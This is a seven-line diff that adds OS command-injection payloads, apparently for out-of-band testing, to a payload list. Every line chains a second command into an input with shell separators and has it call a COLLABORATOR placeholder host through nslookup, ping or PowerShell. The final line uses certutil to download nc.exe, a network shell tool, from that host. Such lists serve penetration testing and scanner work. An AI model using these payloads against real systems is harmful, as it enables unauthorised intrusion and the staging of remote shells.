@@ -1,0 +1,7 @@
+;nslookup COLLABORATOR
+&nslookup COLLABORATOR
+|ping -n 1 COLLABORATOR
+||ping -n 1 COLLABORATOR
+;powershell -c "Invoke-WebRequest http://COLLABORATOR"
+;powershell -c "nslookup COLLABORATOR"
+;certutil -urlcache -split -f http://COLLABORATOR/nc.exe nc.exe
